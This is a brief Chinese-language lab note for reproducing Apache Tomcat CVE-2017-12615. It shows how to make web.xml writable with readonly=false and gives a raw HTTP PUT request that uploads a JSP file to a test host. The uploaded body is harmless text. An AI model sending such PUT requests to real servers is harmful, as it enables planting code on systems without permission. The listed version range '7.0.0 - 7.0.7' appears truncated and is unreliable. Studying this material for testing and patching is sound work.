# tomcat远程命令执行漏洞(CVE-2017-12615)
###  tomcat 下载地址
`https://archive.apache.org/dist/tomcat/`
### 受影响版本
>
> `CVE-2017-12616影响范围：Apache Tomcat 7.0.0 - 7.0.80`
>
> `CVE-2017-12615影响范围：Apache Tomcat 7.0.0 - 7.0.7`


> CVE-2017-12615漏洞利用需要在Windows环境，且需要将 readonly 初始化参数由默认值设置为 false，经过实际测试，Tomcat 7.x版本内web.xml配置文件内默认配置无readonly参数，需要手工添加，默认配置条件下不受此漏洞影响。
> 
>
### tomcat安装目录下`conf`文件夹下`web.xml`文件中，添加如下代码
```angular2
<init-param>
    <param-name>readonly</param-name>
    <param-value>false</param-value>
</init-param>
```
### 事例：
```angular2html

    <servlet>
        <servlet-name>default</servlet-name>
        <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
        <init-param>
            <param-name>debug</param-name>
            <param-value>0</param-value>
        </init-param>
        <init-param>
            <param-name>listings</param-name>
            <param-value>false</param-value>
        </init-param>
		<init-param>
        <param-name>readonly</param-name>
        <param-value>false</param-value>
		</init-param>
        <load-on-startup>1</load-on-startup>
    </servlet>

```

### Payload(CVE-2017-12615)
```
PUT /1.jsp/ HTTP/1.1
Host: 10.2.7.16:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 3

sss
```

> 注：默认安装不存在此漏洞，